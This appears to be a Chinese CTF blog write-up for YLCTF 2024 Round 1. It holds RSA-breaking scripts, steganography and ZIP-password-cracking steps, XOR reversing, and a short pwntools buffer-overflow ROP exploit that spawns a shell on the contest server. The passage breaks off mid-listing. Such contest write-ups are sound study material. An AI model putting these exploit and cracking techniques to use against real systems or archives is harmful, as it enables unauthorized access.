    <url>/2024/11/01/2024-YLCTF/</url>
    
    <content type="html"><![CDATA[<h3 id="Round-1"><a href="#Round-1" class="headerlink" title="Round 1"></a>Round 1</h3><h4 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h4><h5 id="Round-1-BREAK"><a href="#Round-1-BREAK" class="headerlink" title="[Round 1] BREAK"></a>[Round 1] BREAK</h5><p>随机了一个(55555,66666)的e，爆破一下就出了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><br>c = <span class="hljs-number">2924474039245207571198784141495689937992753969132480503242933533024162740004938423057237165017818906240932582715571015311615140080805023083962661783117059081563515779040295926885648843373271315827557447038547354198633841318619550200065416569879422309228789074212184023902170629973366868476512892731022218074481334467704848598178703915477912059538625730030159772883926139645914921352787315268142917830673283253131667111029720811149494108036204927030497411599878456477044315081343437693246136153310194047948564341148092314660072088671342677689405603317615027453036593857501070187347664725660962477605859064071664385456</span><br>p = <span class="hljs-number">112201812592436732390795120344111949417282805598314874949132199714697698933980025001138515893011073823715376332558632580563147885418631793000008453933543935617128269371275964779672888059389120797503550397834151733721290859419396400302434404551112484195071653351729447294368676427327217463094723449293599543541</span><br>q = <span class="hljs-number">177020901129489152716203177604566447047904210970788458377477238771801463954823395388149502481778049515384638107090852884561335334330598757905074879935774091890632735202395688784335456371467073899458492800214225585277983419966028073512968573622161412555169766112847647015717557828009246475428909355149575012613</span><br>n = p * q<br>phi = (p-<span class="hljs-number">1</span>) * (q-<span class="hljs-number">1</span>)<br><span class="hljs-keyword">for</span> e <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">55555</span>,<span class="hljs-number">66666</span>):<br>    <span class="hljs-keyword">if</span> GCD(e, phi) != <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">continue</span><br>    d = invert(e, phi)<br>    m = long_to_bytes(<span class="hljs-built_in">pow</span>(c,d,n))<br>    <span class="hljs-keyword">try</span>:<br>        flag=m.decode()<br>        <span class="hljs-keyword">if</span> flag.startswith(<span class="hljs-string">&quot;YLCTF&quot;</span>):<br>            <span class="hljs-built_in">print</span>(m.decode())<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><p>YLCTF{fbb6186c-6603-11ef-ba80-deb857dc15be}</p><h5 id="Round-1-ezrsa"><a href="#Round-1-ezrsa" class="headerlink" title="[Round 1] ezrsa"></a>[Round 1] ezrsa</h5><p>解p q，然后直接pqec</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> Crypto.Util.number import *<br><span class="hljs-keyword">from</span> gmpy2 import *<br><br><span class="hljs-attribute">hint</span>=104636942321216253499949196992650472436478390748311279997623168444858856212565005575470777025761133042669819087704276518792916869976910488638447567239130212411230613882721172767760926001948961427578800015022259031969968165104053974655999826752934643354758068059342697992941002284015306229237883529295068534566<br><span class="hljs-attribute">n</span>=113323597991624085061754988720439733629524452351931678771262752971035806969352132347016596705526432331903062544002592718117059786374051405428649396204710173913937575477670669321722166487652633727914336210161512781725047690929712364271174654635583233107540578279184329790997368051997427982806978603449019597017<br><span class="hljs-attribute">c</span>=107037286198526394985865182892078748932585076646994108020169994674725585397106369955977692402870725711803853270592931219086132270954286345566389580075401065352179549462941235338798967012704257894673451346168055976240149419808637015749212370865797366048562011252603524950648669269654406391113686485024119636451<br><span class="hljs-attribute">e</span>=65537<br><span class="hljs-attribute">h</span>=20240918<br><span class="hljs-attribute">yl</span>=bytes_to_long(b&quot;YLCTF&quot;)<br><br><span class="hljs-attribute">p</span>=gcd(pow(20240918,e,n)-hint,n)<br><span class="hljs-attribute">q</span>=n//p<br>phi=(p-1)*(q-1)<br><span class="hljs-attribute">d</span>=inverse(e,phi)<br><span class="hljs-attribute">m</span>=pow(c,d,n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><h5 id="Round-1-r-A-3"><a href="#Round-1-r-A-3" class="headerlink" title="[Round 1] r(A)&#x3D;3"></a>[Round 1] r(A)&#x3D;3</h5><p>300次三元一次方程组出flag</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs vim">import numpy <span class="hljs-keyword">as</span> np<br>from pwn import *<br><br><span class="hljs-keyword">p</span>=remote(<span class="hljs-string">&quot;challenge.yuanloo.com&quot;</span>,<span class="hljs-number">33813</span>)<br><span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-number">300</span>):<br>    question=<span class="hljs-keyword">p</span>.recvuntil(<span class="hljs-keyword">b</span><span class="hljs-string">&quot;input x=&quot;</span>)<br>    question=question.decode()<br>    <span class="hljs-keyword">if</span> question.startswith(<span class="hljs-string">&quot;func&quot;</span>) <span class="hljs-keyword">is</span> False:<br>        question=question[<span class="hljs-number">1</span>:]<br>    question=question.replace(<span class="hljs-string">&quot;*x&quot;</span>,<span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;*y&quot;</span>,<span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;*z&quot;</span>,<span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;&quot;</span>)<br>    question=question.<span class="hljs-keyword">split</span>(<span class="hljs-string">&quot;\n&quot;</span>)<br>    <span class="hljs-keyword">print</span>(question)<br>    tem1=question[<span class="hljs-number">1</span>].<span class="hljs-keyword">split</span>(<span class="hljs-string">&quot;=&quot;</span>)<br>    tem2=question[<span class="hljs-number">2</span>].<span class="hljs-keyword">split</span>(<span class="hljs-string">&quot;=&quot;</span>)<br>    tem3 = question[<span class="hljs-number">3</span>].<span class="hljs-keyword">split</span>(<span class="hljs-string">&quot;=&quot;</span>)<br>    # <span class="hljs-keyword">print</span>(tem1[<span class="hljs-number">0</span>].<span class="hljs-keyword">split</span>(<span class="hljs-string">&quot;+&quot;</span>),tem2[<span class="hljs-number">0</span>].<span class="hljs-keyword">split</span>(<span class="hljs-string">&quot;+&quot;</span>),tem3[<span class="hljs-number">0</span>].<span class="hljs-keyword">split</span>(<span class="hljs-string">&quot;+&quot;</span>))<br>    A=[np.array([<span class="hljs-keyword">int</span>(coef.<span class="hljs-keyword">split</span>(<span class="hljs-string">&#x27;*&#x27;</span>)[<span class="hljs-number">0</span>]) <span class="hljs-keyword">for</span> coef in equation[<span class="hljs-number">0</span>].<span class="hljs-keyword">split</span>(<span class="hljs-string">&#x27;=&#x27;</span>)[<span class="hljs-number">0</span>].<span class="hljs-keyword">split</span>(<span class="hljs-string">&#x27;+&#x27;</span>)]) <span class="hljs-keyword">for</span> equation in [tem1, tem2, tem3]]<br>    B=np.array([<span class="hljs-keyword">int</span>(tem1[<span class="hljs-number">1</span>]),<span class="hljs-keyword">int</span>(tem2[<span class="hljs-number">1</span>]),<span class="hljs-keyword">int</span>(tem3[<span class="hljs-number">1</span>])])<br>    solution = np.linalg.solve(A, B)<br>    # <span class="hljs-keyword">print</span>(A,B)<br>    # <span class="hljs-keyword">print</span>(solution,solution[<span class="hljs-number">0</span>])<br>    <span class="hljs-keyword">p</span>.send(<span class="hljs-keyword">b</span><span class="hljs-string">&quot;&quot;</span>+str(<span class="hljs-keyword">int</span>(solution[<span class="hljs-number">0</span>])).encode()+<span class="hljs-keyword">b</span><span class="hljs-string">&quot;\n&quot;</span>)<br>    <span class="hljs-keyword">p</span>.recvuntil(<span class="hljs-keyword">b</span><span class="hljs-string">&quot;input y=&quot;</span>)<br>    <span class="hljs-keyword">p</span>.send(<span class="hljs-keyword">b</span><span class="hljs-string">&quot;&quot;</span> + str(<span class="hljs-keyword">int</span>(solution[<span class="hljs-number">1</span>])).encode() + <span class="hljs-keyword">b</span><span class="hljs-string">&quot;\n&quot;</span>)<br>    <span class="hljs-keyword">p</span>.recvuntil(<span class="hljs-keyword">b</span><span class="hljs-string">&quot;input z=&quot;</span>)<br>    <span class="hljs-keyword">p</span>.send(<span class="hljs-keyword">b</span><span class="hljs-string">&quot;&quot;</span> + str(<span class="hljs-keyword">int</span>(solution[<span class="hljs-number">2</span>])).encode() + <span class="hljs-keyword">b</span><span class="hljs-string">&quot;\n&quot;</span>)<br>output = <span class="hljs-keyword">p</span>.recvall(timeout=<span class="hljs-number">1</span>)<br><span class="hljs-keyword">print</span>(output)<br></code></pre></td></tr></table></figure><h5 id="Round-1-signrsa"><a href="#Round-1-signrsa" class="headerlink" title="[Round 1] signrsa"></a>[Round 1] signrsa</h5><p>joker了，写了半天n1 n2写反了</p><p>n1 n2不互质</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs makefile">import gmpy2<br>from Crypto.Util.number import *<br><br><span class="hljs-comment"># 已知的密文和模数</span><br>c = 11516173591592387906528797379284719795659927455162331287042410048172205165682815496982552736149847293575228447650607173879891237665489165461873584174287049895850806805566416766585174732676570562193236916785212914791455690292098582511732972439329406423849445368901444923413796301821732962348908247264986674076253972004983394740647381170967650483500171133548129598809265793962610544123055917829945304385904168530690154121382284046800766368554453741911901865827653525076994196646226659413518765482367754861846294144696364783637484503733916678013113384781260011541947539387908774730911805898716383177397837414195581787711<br>n1 = 18674375108313094928585156581138941368570022222190945461284402673204018075354069827186085851309806592398721628845336840532779579197302984987661547245423180760958022898546496524249201679543421158842103496452861932183144343315925106154322066796612415616342291023962127055311307613898583850177922930685155351380500587263611591893137588708003711296496548004793832636078992866149115453883484010146248683416979269684197112659302912316105354447631916609587360103908746719586185593386794532066034112164661723748874045470225129298518385683561122623859924435600673501186244422907402943929464694448652074412105888867178867357727<br>n2 = 20071978783607427283823783012022286910630968751671103864055982304683197064862908267206049336732205051588820325894943126769930029619538705149178241710069113634567118672515743206769333625177879492557703359178528342489585156713623530654319500738508146831223487732824835005697932704427046675392714922683584376449203594641540794557871881581407228096642417744611261557101573050163285919971711214856243031354845945564837109657494523902296444463748723639109612438012590084771865377795409000586992732971594598355272609789079147061852664472115395344504822644651957496307894998467309347038349470471900776050769578152203349128951<br>p = gmpy2.gcd(n1, n2)<br>assert (p != 1)<br>print(f<span class="hljs-string">&quot;p = &#123;p&#125;&quot;</span>)<br>q1 = n1 // p<br>q2 = n2 // p<br>e = 65537<br>d1 = inverse(e, (p - 1) * (q1 - 1))<br>d2 = inverse(e, (p - 1) * (q2 - 1))<br>c = pow(c, d2, n2)<br>m = pow(c, d1, n1)<br>print(long_to_bytes(m))<br></code></pre></td></tr></table></figure><p>YLCTF{23d36cbe-52d7-46b4-addb-56bde327a37f}</p><h5 id="Round-1-threecry"><a href="#Round-1-threecry" class="headerlink" title="[Round 1] threecry"></a>[Round 1] threecry</h5><p>首先是确定素数p和q。已知a是512位的素数。利用相邻素数定律，得出得出n≈13×25×a2。通过对n开平方近似获取a，然后循环寻找下一个素数，直到n被整除，最终计算出p q，由于e&#x3D;57742是偶数，过程中需要考虑e phi的互素关系。</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs scss">from Crypto<span class="hljs-selector-class">.Util</span><span class="hljs-selector-class">.number</span> import long_to_bytes<br>import gmpy2<br><br>def <span class="hljs-built_in">calculate_a_near</span>(number2):<br>    a_near = gmpy2.<span class="hljs-built_in">iroot</span>(number2 // <span class="hljs-number">325</span>, <span class="hljs-number">2</span>)[<span class="hljs-number">0</span>]<br>    while number2 % gmpy2.<span class="hljs-built_in">next_prime</span>(<span class="hljs-number">13</span> * a_near) != <span class="hljs-number">0</span>:<br>        a_near = gmpy2.<span class="hljs-built_in">next_prime</span>(a_near)<br>    return a_near<br><br>def <span class="hljs-built_in">calculate_p_q</span>(number2, a_near):<br>    p = gmpy2.<span class="hljs-built_in">next_prime</span>(<span class="hljs-number">13</span> * a_near)<br>    q = number2 // p<br>    return p, q<br><br>def <span class="hljs-built_in">decrypt_c2</span>(c2, e, number2):<br>    a_near = <span class="hljs-built_in">calculate_a_near</span>(number2)<br>    p, q = <span class="hljs-built_in">calculate_p_q</span>(number2, a_near)<br>    phi = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)  # 直接计算 phi<br>    t = gmpy2.<span class="hljs-built_in">gcd</span>(e, phi)<br>    d = gmpy2.<span class="hljs-built_in">invert</span>(e // t, phi)<br>    m2 = gmpy2.<span class="hljs-built_in">iroot</span>(<span class="hljs-built_in">pow</span>(c2, d, number2), t)[<span class="hljs-number">0</span>]<br>    return <span class="hljs-built_in">long_to_bytes</span>(m2)<br><br>def <span class="hljs-built_in">decrypt_c1</span>(c1, number1, number2, phi):<br>    d1 = gmpy2.<span class="hljs-built_in">invert</span>(number1, phi)<br>    m1 = <span class="hljs-built_in">pow</span>(c1, d1, number2)<br>    return <span class="hljs-built_in">long_to_bytes</span>(m1)<br><br>if __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    number1 = <span class="hljs-number">6035830951309638186877554194461701691293718312181839424149825035972373443231514869488117139554688905904333169357086297500189578624512573983935412622898726797379658795547168254487169419193859102095920229216279737921183786260128443133977458414094572688077140538467216150378641116223616640713960883880973572260683</span><br>    number2 = <span class="hljs-number">20163906788220322201451577848491140709934459544530540491496316478863216041602438391240885798072944983762763612154204258364582429930908603435291338810293235475910630277814171079127000082991765275778402968190793371421104016122994314171387648385459262396767639666659583363742368765758097301899441819527512879933947</span><br>    c1 = <span class="hljs-number">12405608660999618097265957137437366071663331952214754002907325304531075800258689590061456707831342835487524037479295573967671590772372879729320816515170640997390767343571441259299771369979031179671545706559882752613500283385673730661771556761298039859614400629468643522376263695765234012418732741549726229907684</span><br>    c2 = <span class="hljs-number">17867493009629454195723402795923807278976405761266687248923423443324682687084222151828263506140089233231214258259873864593871903110076859979044544920410209161618245640658572478006954994831673052121417154093147829059704015532088485831531000877870512720482263657406229891194171974695942960168522826499853303675454</span><br>    e = <span class="hljs-number">57742</span><br><br>    a_near = <span class="hljs-built_in">calculate_a_near</span>(number2)<br>    p, q = <span class="hljs-built_in">calculate_p_q</span>(number2, a_near)<br>    phi = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)  # 直接计算 phi<br><br>    flag2 = <span class="hljs-built_in">decrypt_c2</span>(c2, e, number2)<br>    flag1 = <span class="hljs-built_in">decrypt_c1</span>(c1, number1, number2, phi)<br>    <span class="hljs-built_in">print</span>(flag1 + flag2)<br></code></pre></td></tr></table></figure><h4 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h4><h5 id="签到-打卡小能手"><a href="#签到-打卡小能手" class="headerlink" title="[签到] 打卡小能手"></a>[签到] 打卡小能手</h5><p>没什么说的</p><p>YLCTF{W3lc0m3_T0_Yuan1ooCtf}</p><h5 id="Round-1-hide-png"><a href="#Round-1-hide-png" class="headerlink" title="[Round 1] hide_png"></a>[Round 1] hide_png</h5><p>眼睛看瞎了</p><p><img src="../../../../img/archives/2024-YLCTF/image-20241010130322341.png" alt="image-20241010130322341"></p><p><img src="../../../../img/archives/2024-YLCTF/image-20241010130243649.png" alt="image-20241010130243649"></p><p>YLCTF{a27f2d1a-9176-42cf-a2b6-1c87b17b98dc}</p><h5 id="Round-1-pngorzip"><a href="#Round-1-pngorzip" class="headerlink" title="[Round 1] pngorzip"></a>[Round 1] pngorzip</h5><p>stegsolve lsb分离出zip，删除后面的无用内容，提示114514????</p><p>直接ARCHPR掩码爆破出114514giao</p><p><img src="../../../../img/archives/2024-YLCTF/image-20241010130549709.png" alt="image-20241010130549709"></p><p>YLCTF{d359d6e4-740a-49cf-83eb-5b0308f09c8c}</p><h5 id="Round-1-plain-crack"><a href="#Round-1-plain-crack" class="headerlink" title="[Round 1] plain_crack"></a>[Round 1] plain_crack</h5><p>一眼丁真 明文攻击</p><p>压缩build.py，直接ARCHPR解一下，然后解出docx，改后缀为.zip在里面找到flag图片</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding:utf8 -*-</span><br><br><span class="hljs-keyword">import</span> pyminizip<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">files, zfile</span>):<br>    pyminizip.compress_multiple(files,[], zfile,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    files = [<span class="hljs-string">&#x27;build.py&#x27;</span>]<br>    zfile = <span class="hljs-string">&#x27;crack2.zip&#x27;</span><br>    create(files, zfile)<br></code></pre></td></tr></table></figure><p><img src="../../../../img/archives/2024-YLCTF/image-20241010131438267.png" alt="image-20241010131438267"></p><p><img src="../../../../img/archives/2024-YLCTF/image-20241010131456743.png" alt="image-20241010131456743"></p><p><img src="../../../../img/archives/2024-YLCTF/image-20241010130916284.png" alt="image-20241010130916284"></p><h5 id="Round-1-trafficdet"><a href="#Round-1-trafficdet" class="headerlink" title="[Round 1] trafficdet"></a>[Round 1] trafficdet</h5><p>sklearn随机森林直接出，一开始以为要练模型折腾半天，诶，没血</p><p>训练集0.9 验证集0.1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><span class="hljs-keyword">from</span> sklearn.model_selection <span class="hljs-keyword">import</span> train_test_split<br><span class="hljs-keyword">from</span> sklearn.ensemble <span class="hljs-keyword">import</span> RandomForestClassifier<br><span class="hljs-keyword">from</span> sklearn.metrics <span class="hljs-keyword">import</span> accuracy_score<br><br>train_data = pd.read_csv(<span class="hljs-string">&#x27;train.csv&#x27;</span>)<br>train_data = train_data.dropna()<br><br>X = train_data.drop(columns=[<span class="hljs-string">&#x27;Label&#x27;</span>])<br>y = train_data[<span class="hljs-string">&#x27;Label&#x27;</span>]<br>X_train, X_val, y_train, y_val = train_test_split(X, y, test_size=<span class="hljs-number">0.1</span>, random_state=<span class="hljs-number">42</span>)<br><br>model = RandomForestClassifier(n_estimators=<span class="hljs-number">100</span>, random_state=<span class="hljs-number">42</span>)<br>model.fit(X_train, y_train)<br>y_pred = model.predict(X_val)<br><br><span class="hljs-built_in">print</span>(accuracy_score(y_val, y_pred))<br><br>test_data = pd.read_csv(<span class="hljs-string">&#x27;test.csv&#x27;</span>)<br>X_test = test_data<br>test_preds = model.predict(X_test)<br><br>result = pd.DataFrame(&#123;<br>    <span class="hljs-string">&#x27;Label&#x27;</span>: test_preds<br>&#125;)<br>result.index=result.index+<span class="hljs-number">1</span><br>result.to_csv(<span class="hljs-string">&#x27;result.csv&#x27;</span>)<br></code></pre></td></tr></table></figure><h5 id="Round-1-whatmusic"><a href="#Round-1-whatmusic" class="headerlink" title="[Round 1] whatmusic"></a>[Round 1] whatmusic</h5><p>png逆序，修复宽高，翻转</p><p>lyra解音频，在线网站听一下，听不了一点</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;password&quot;</span>,<span class="hljs-string">&quot;rb+&quot;</span>)<span class="hljs-selector-class">.read</span>()<br>f2=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;password.png&quot;</span>,<span class="hljs-string">&quot;wb+&quot;</span>)<span class="hljs-selector-class">.write</span>(f<span class="hljs-selector-attr">[::-1]</span>)<br></code></pre></td></tr></table></figure><p><img src="../../../../img/archives/2024-YLCTF/image-20241011203712841.png" alt="image-20241011203712841"></p><p><img src="../../../../img/archives/2024-YLCTF/image-20241011213855014.png" alt="image-20241011213855014"></p><p><img src="../../../../img/archives/2024-YLCTF/image-20241011203751254.png" alt="image-20241011203751254"></p><p>YLCTF{YLYRM6S5ICG00ODLL0VE}</p><h4 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h4><h5 id="Round-1-giaopwn"><a href="#Round-1-giaopwn" class="headerlink" title="[Round 1] giaopwn"></a>[Round 1] giaopwn</h5><p><img src="../../../../img/archives/2024-YLCTF/image-20241012204302823.png" alt="image-20241012204302823"></p><p><img src="../../../../img/archives/2024-YLCTF/image-20241012204318368.png" alt="image-20241012204318368"></p><p><img src="../../../../img/archives/2024-YLCTF/image-20241012204334392.png" alt="image-20241012204334392"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><br><span class="hljs-attribute">p</span>=remote(&quot;challenge.yuanloo.com&quot;,43089)<br>p.recvuntil(b<span class="hljs-string">&quot;welcome to YLCTF&quot;</span>)<br><span class="hljs-attribute">rdi</span>=0x400743<br><span class="hljs-attribute">system</span>=0x4006D2<br><span class="hljs-attribute">sh</span>=0x601048<br><span class="hljs-attribute">payload</span>=b&#x27;a&#x27;*0x28+p64(rdi)+p64(sh)+p64(system)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h4 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h4><h5 id="Round-1-xor"><a href="#Round-1-xor" class="headerlink" title="[Round 1] xor"></a>[Round 1] xor</h5><p>upx脱壳，看了是xor 28，直接写脚本解密</p><p><img src="../../../../img/archives/2024-YLCTF/image-20241012002620489.png" alt="image-20241012002620489"></p><p><img src="../../../../img/archives/2024-YLCTF/image-20241012002638396.png" alt="image-20241012002638396"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import xor<br><br><span class="hljs-attribute">key</span>=<span class="hljs-number">28</span><br><span class="hljs-attribute">l</span>=[<span class="hljs-number">0</span>x45,<span class="hljs-number">0</span>x50,<span class="hljs-number">0</span>x5f,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>x5a,<span class="hljs-number">0</span>x67,<span class="hljs-number">0</span>x7e,<span class="hljs-number">0</span>x2f,<span class="hljs-number">0</span>x7f,<span class="hljs-number">0</span>x2d,<span class="hljs-number">0</span>x29,<span class="hljs-number">0</span>x7f,<span class="hljs-number">0</span>x24,<span class="hljs-number">0</span>x25,<span class="hljs-number">0</span>x31,<span class="hljs-number">0</span>x25,<span class="hljs-number">0</span>x79,<span class="hljs-number">0</span>x79,<span class="hljs-number">0</span>x2f,<span class="hljs-number">0</span>x31,<span class="hljs-number">0</span>x28,<span class="hljs-number">0</span>x7e,<span class="hljs-number">0</span>x7f,<span class="hljs-number">0</span>x2e,<span class="hljs-number">0</span>x31,<span class="hljs-number">0</span>x7e,<span class="hljs-number">0</span>x78,<span class="hljs-number">0</span>x2d,<span class="hljs-number">0</span>x7d,<span class="hljs-number">0</span>x31,<span class="hljs-number">0</span>x2f,<span class="hljs-number">0</span>x2c,<span class="hljs-number">0</span>x2e,<span class="hljs-number">0</span>x79,<span class="hljs-number">0</span>x7d,<span class="hljs-number">0</span>x7f,<span class="hljs-number">0</span>x28,<span class="hljs-number">0</span>x7a,<span class="hljs-number">0</span>x2c,<span class="hljs-number">0</span>x29,<span class="hljs-number">0</span>x7a,<span class="hljs-number">0</span>x2f,<span class="hljs-number">0</span>x61,<span class="hljs-number">0</span>x1c]<br><span class="hljs-attribute">flag</span>=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-attribute">for</span> i in l:<br>    <span class="hljs-attribute">flag</span>+=xor(chr(int(i)%<span class="hljs-number">128</span>),key).decode()<br><span class="hljs-attribute">print</span>(flag)<br></code></pre></td></tr></table></figure><p>YLCTF{b3c15c89-9ee3-4bc2-bd1a-302eac4f05f3}</p><h5 id="Round-1-calc"><a href="#Round-1-calc" class="headerlink" title="[Round 1] calc"></a>[Round 1] calc</h5><p>gpt复原源码</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">typedef struct Stack &#123;<br>    <span class="hljs-type">double</span>* top; <span class="hljs-type">double</span>* low; <span class="hljs-type">int</span> size;<br>&#125;stack;<span class="hljs-type">void</span> init(stack* s) &#123;<br>    s-&gt;low = (<span class="hljs-type">double</span>*)malloc((sizeof(<span class="hljs-type">double</span>))) s-&gt;top = s-&gt;low;s-&gt;size = <span class="hljs-number">100</span>;<br>&#125;<span class="hljs-type">void</span> push(stack* s, <span class="hljs-type">double</span> e) &#123;<br>    *(s-&gt;top) = e; s-&gt;top++;<br>&#125;<span class="hljs-type">void</span> pop(stack* s, <span class="hljs-type">double</span>* e) &#123;<br>    *e = *<span class="hljs-comment">--(s-&gt;top);</span><br>&#125;<span class="hljs-type">int</span> main() &#123;<br>    setbuf((__acrt_iob_func(<span class="hljs-number">0</span>)), <span class="hljs-number">0</span>); setbuf((__acrt_iob_func(<span class="hljs-number">1</span>)), <span class="hljs-number">0</span>);stack s; <span class="hljs-type">char</span> ch;<span class="hljs-type">double</span> d, e <span class="hljs-type">char</span> num[<span class="hljs-number">100</span>];<span class="hljs-type">int</span> i = <span 